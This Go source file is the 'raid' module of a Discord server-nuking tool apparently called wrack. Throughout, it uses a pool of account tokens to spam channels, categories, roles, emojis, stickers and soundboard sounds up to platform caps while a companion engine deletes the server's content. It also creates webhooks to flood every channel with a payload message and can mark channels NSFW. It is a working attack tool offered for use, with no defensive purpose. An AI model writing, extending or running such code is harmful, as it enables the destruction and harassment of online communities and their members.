// Package raid spams creation of channels/categories/roles/emojis/stickers/
// sounds concurrently with the nuke's deletions. Created objects are tracked
// so wrack never deletes its own work.
package raid

import (
	"context"
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/M1noa/wrack/api"
	"github.com/M1noa/wrack/nuke"
	"github.com/M1noa/wrack/payload"
	"github.com/M1noa/wrack/token"
	"github.com/M1noa/wrack/ui"
	"github.com/M1noa/wrack/work"
)

// Config caps spam creation (0 = hit Discord limits).
type Config struct {
	GuildID       string
	Short         string // base name for everything
	MaxChannels   int
	MaxCategories int
	MaxRoles      int
	MaxEmojis     int
	MaxStickers   int
	MaxSounds     int
	NSFW          bool
	ImageData     []byte
	NoWebhook     bool
	ForceHook     bool
}

// Engine creates spam objects.
type Engine struct {
	Cfg  *Config
	Pool *token.Pool
	Nuke *nuke.Engine
	Disp *work.Dispatcher
	msg  *payload.Message

	newChans chan api.Channel         // created channels stream to hook pumps
	cats     []api.Channel            // categories we made (random parents)
	hooks    map[string]*api.Webhook  // channel id -> webhook
	seq      map[string]*atomic.Int64 // per-type name counters
	attempts int                      // retries per slot before giving up

	mu sync.Mutex
}

// New builds a Raid engine.
func New(cfg *Config, pool *token.Pool, n *nuke.Engine, disp *work.Dispatcher, msg *payload.Message) *Engine {
	return &Engine{
		Cfg: cfg, Pool: pool, Nuke: n, Disp: disp, msg: msg,
		hooks:    make(map[string]*api.Webhook),
		seq:      map[string]*atomic.Int64{"emoji": {}, "sticker": {}, "sound": {}},
		attempts: 40, // retries per slot; deletions free slots mid-run
	}
}

func (e *Engine) tokens() []*token.Token {
	var out []*token.Token
	for _, t := range e.Pool.Tokens {
		if t.InGuild && len(t.Errors) == 0 {
			out = append(out, t)
		}
	}
	return out
}

func (e *Engine) nextTok() *token.Token { return e.Pool.Next() }

// name returns short for the first item of a type, shortN after (unique names).
func (e *Engine) name(kind string) string {
	n := e.seq[kind].Add(1)
	if n <= 1 {
		return e.Cfg.Short
	}
	return fmt.Sprintf("%s%d", e.Cfg.Short, n)
}

// Run launches every creator loop concurrently with the nuke's deletions.
// Returns a func that blocks until all creation + message pumping drains.
func (e *Engine) Run(ctx context.Context) func() {
	e.newChans = make(chan api.Channel, 2048)

	pumps := 4
	pumpDone := make(chan struct{})
	var pumpWG sync.WaitGroup
	pumpWG.Add(pumps)
	for i := 0; i < pumps; i++ {
		go func() {
			defer pumpWG.Done()
			e.hookPump(ctx)
		}()
	}
	go func() { pumpWG.Wait(); close(pumpDone) }()

	var wg sync.WaitGroup
	wg.Add(6)
	go func() { defer wg.Done(); e.categoriesLoop(ctx) }()
	go func() { defer wg.Done(); e.channelsLoop(ctx) }()
	go func() { defer wg.Done(); e.rolesLoop(ctx) }()
	go func() { defer wg.Done(); e.emojisLoop(ctx) }()
	go func() { defer wg.Done(); e.stickersLoop(ctx) }()
	go func() { defer wg.Done(); e.soundsLoop(ctx) }()

	return func() {
		wg.Wait()
		close(e.newChans)
		<-pumpDone
		ui.Ok("webhooks: %d | messages routed", len(e.hooks))
	}
}

// retryLoop hammers fn until it succeeds or attempts run out. Do() already
// hammer-retries 429s internally, so failures here are structural (cap full,
// missing perms); we poll briefly in case deletions free slots mid-run.
func (e *Engine) retryLoop(ctx context.Context, tries int, fn func() error) bool {
	for i := 0; i < tries; i++ {
		if ctx.Err() != nil {
			return false
		}
		if err := fn(); err == nil {
			return true
		}
		select {
		case <-ctx.Done():
			return false
		case <-time.After(75 * time.Millisecond):
		}
	}
	return false
}

func (e *Engine) randomParent() *string {
	e.mu.Lock()
	defer e.mu.Unlock()
	if len(e.cats) == 0 {
		return nil
	}
	id := e.cats[rand.Intn(len(e.cats))].ID
	return &id
}

func (e *Engine) categoriesLoop(ctx context.Context) {
	n := e.Cfg.MaxCategories
	if n <= 0 {
		n = e.Cfg.MaxChannels / 8
		if n <= 0 {
			n = 8
		}
		if n > 40 {
			n = 40
		}
	}
	target := n
	if e.Cfg.MaxChannels > 0 && target > e.Cfg.MaxChannels {
		target = e.Cfg.MaxChannels
	}
	p := &ui.Progress{Label: "mk-cat", Total: int64(target)}
	for i := 0; i < target; i++ {
		e.Disp.Submit("mkCat", func() {
			ok := e.retryLoop(ctx, e.attempts, func() error {
				t := e.nextTok()
				if t == nil {
					return fmt.Errorf("no token")
				}
				ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID,
					map[string]any{"name": e.Cfg.Short, "type": 4})
				if err != nil {
					return err
				}
				e.mu.Lock()
				e.cats = append(e.cats, *ch)
				e.mu.Unlock()
				e.Nuke.TrackCreated(ch.ID)
				return nil
			})
			if ok {
				p.Tick(1)
			}
		})
	}
}

func (e *Engine) channelsLoop(ctx context.Context) {
	target := e.Cfg.MaxChannels
	if target <= 0 {
		target = 500 // Discord guild channel cap
	}
	p := &ui.Progress{Label: "mk-chan", Total: int64(target)}
	for i := 0; i < target; i++ {
		e.Disp.Submit("mkChan", func() {
			ok := e.retryLoop(ctx, e.attempts, func() error {
				t := e.nextTok()
				if t == nil {
					return fmt.Errorf("no token")
				}
				body := map[string]any{"name": e.Cfg.Short, "type": 0}
				if parent := e.randomParent(); parent != nil {
					body["parent_id"] = *parent
				}
				if e.Cfg.NSFW {
					body["nsfw"] = true
				}
				ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID, body)
				if err != nil {
					return err
				}
				e.Nuke.TrackCreated(ch.ID)
				select {
				case e.newChans <- *ch:
				default:
				}
				return nil
			})
			if ok {
				p.Tick(1)
			}
		})
	}
}

func (e *Engine) rolesLoop(ctx context.Context) {
	target := e.Cfg.MaxRoles
	if target <= 0 {
		target = 250
	}
	p := &ui.Progress{Label: "mk-role", Total: int64(target)}
	for i := 0; i < target; i++ {
		e.Disp.Submit("mkRole", func() {
			ok := e.retryLoop(ctx, e.attempts, func() error {
				t := e.nextTok()
				if t == nil {
					return fmt.Errorf("no token")
				}
				r, err := t.Client.CreateRole(ctx, e.Cfg.GuildID, map[string]any{
					"name":        e.Cfg.Short,
					"color":       ui.AccentColor,
					"mentionable": true,
				})
				if err != nil {
					return err
				}
				e.Nuke.TrackCreated(r.ID)
				return nil
			})
			if ok {
				p.Tick(1)
			}
		})
	}
}

func (e *Engine) emojisLoop(ctx context.Context) {
	img := e.Cfg.ImageData
	if img == nil {
		b, err := payload.BlankPNG(320)
		if err != nil {
			return
		}
		img = b
	}
	dataURI := payload.DataURI(img)

	target := e.Cfg.MaxEmojis
	if target <= 0 {
		target = emojiCap(guildTier(e))
	}
	p := &ui.Progress{Label: "mk-emoji", Total: int64(target)}
	for i := 0; i < target; i++ {
		e.Disp.Submit("mkEmoji", func() {
			name := e.name("emoji")
			ok := e.retryLoop(ctx, e.attempts, func() error {
				t := e.nextTok()
				if t == nil {
					return fmt.Errorf("no token")
				}
				em, err := t.Client.CreateEmoji(ctx, e.Cfg.GuildID,
					map[string]any{"name": name, "image": dataURI})
				if err != nil {
					return err
				}
				e.Nuke.TrackCreated(em.ID)
				return nil
			})
			if ok {
				p.Tick(1)
			}
		})
	}
}

func guildTier(e *Engine) int {
	if e.Nuke.Snap != nil && e.Nuke.Snap.Guild != nil {
		return e.Nuke.Snap.Guild.PremiumTier
	}
	return 0
}

func emojiCap(tier int) int {
	switch tier {
	case 3:
		return 250
	case 2:
		return 150
	case 1:
		return 100
	default:
		return 50
	}
}

func stickerCap(tier int) int {
	switch tier {
	case 3:
		return 60
	case 2:
		return 30
	case 1:
		return 15
	default:
		return 5
	}
}

func soundCap(tier int) int {
	switch tier {
	case 3:
		return 96
	case 2:
		return 48
	case 1:
		return 24
	default:
		return 8
	}
}

func (e *Engine) stickersLoop(ctx context.Context) {
	img := e.Cfg.ImageData
	fileType := "image/png"
	fname := "wrack.png"
	if img == nil {
		b, err := payload.BlankPNG(320)
		if err != nil {
			return
		}
		img = b
	}

	target := e.Cfg.MaxStickers
	if target <= 0 {
		target = stickerCap(guildTier(e))
	}
	p := &ui.Progress{Label: "mk-sticker", Total: int64(target)}
	for i := 0; i < target; i++ {
		e.Disp.Submit("mkSticker", func() {
			name := e.name("sticker")
			ok := e.retryLoop(ctx, e.attempts, func() error {
				t := e.nextTok()
				if t == nil {
					return fmt.Errorf("no token")
				}
				s, err := t.Client.CreateSticker(ctx, e.Cfg.GuildID,
					name, "", name, fname, fileType, img)
				if err != nil {
					return err
				}
				e.Nuke.TrackCreated(s.ID)
				return nil
			})
			if ok {
				p.Tick(1)
			}
		})
	}
}

func (e *Engine) soundsLoop(ctx context.Context) {
	soundBytes := payload.SilentMP3()
	dataURI := "data:audio/mpeg;base64," + base64.StdEncoding.EncodeToString(soundBytes)

	target := e.Cfg.MaxSounds
	if target <= 0 {
		target = soundCap(guildTier(e))
	}
	p := &ui.Progress{Label: "mk-sound", Total: int64(target)}
	for i := 0; i < target; i++ {
		e.Disp.Submit("mkSound", func() {
			name := e.name("sound")
			ok := e.retryLoop(ctx, e.attempts, func() error {
				t := e.nextTok()
				if t == nil {
					return fmt.Errorf("no token")
				}
				resp, err := t.Client.Do(ctx, "POST",
					fmt.Sprintf("/guilds/%s/soundboard-sounds", e.Cfg.GuildID),
					map[string]any{"name": name, "sound": dataURI})
				if err != nil {
					return err
				}
				if resp.StatusCode >= 400 {
					api.DiscardBody(resp)
					return fmt.Errorf("create sound: %d", resp.StatusCode)
				}
				var s api.SoundboardSound
				if err := api.DecodeJSON(resp, &s); err != nil {
					return err
				}
				e.Nuke.TrackCreated(s.SoundID)
				return nil
			})
			if ok {
				p.Tick(1)
			}
		})
	}
}

// hookPump consumes newly created channels: attaches a webhook and fires the
// payload through it (or normal-sends when webhooks aren't available/allowed).
func (e *Engine) hookPump(ctx context.Context) {
	hookTokens := e.Pool.WithPerm(api.PermManageWebhooks)
	useHooks := !e.Cfg.NoWebhook && len(hookTokens) > 0

	for ch := range e.newChans {
		sent := false
		if useHooks {
			t := hookTokens[rand.Intn(len(hookTokens))]
			w, err := t.Client.CreateWebhook(ctx, ch.ID, e.Cfg.Short, "wrack")
			if err == nil && w != nil && w.Token != nil && *w.Token != "" {
				e.mu.Lock()
				e.hooks[ch.ID] = w
				e.mu.Unlock()
				e.Nuke.TrackCreated(w.ID)
				if e.msg != nil && t.Client.ExecuteWebhook(ctx, w.ID, *w.Token, e.msg) == nil {
					sent = true
				}
			}
		}
		if !sent && e.msg != nil && !e.Cfg.ForceHook {
			t := e.nextTok()
			if t != nil {
				_ = t.Client.SendMessage(ctx, ch.ID, e.msg)
			}
		}
	}
}

// MessagesOnly floods existing channels without deleting anything.
func (e *Engine) MessagesOnly(ctx context.Context) {
	if e.Nuke.Snap == nil {
		return
	}
	chans := e.Nuke.Snap.TextVoice
	if len(chans) == 0 || e.msg == nil {
		return
	}
	hookTokens := e.Pool.WithPerm(api.PermManageWebhooks)
	useHooks := !e.Cfg.NoWebhook && len(hookTokens) > 0
	p := &ui.Progress{Label: "msg", Total: int64(len(chans))}
	for _, ch := range chans {
		ch := ch
		e.Disp.Submit("msg", func() {
			sent := false
			if useHooks {
				t := hookTokens[rand.Intn(len(hookTokens))]
				w, err := t.Client.CreateWebhook(ctx, ch.ID, e.Cfg.Short, "wrack")
				if err == nil && w != nil && w.Token != nil && *w.Token != "" {
					if t.Client.ExecuteWebhook(ctx, w.ID, *w.Token, e.msg) == nil {
						sent = true
					}
				}
			}
			if !sent && !e.Cfg.ForceHook {
				t := e.nextTok()
				if t != nil {
					_ = t.Client.SendMessage(ctx, ch.ID, e.msg)
				}
			}
			p.Tick(1)
		})
	}
}

var _ = strings.TrimSpace
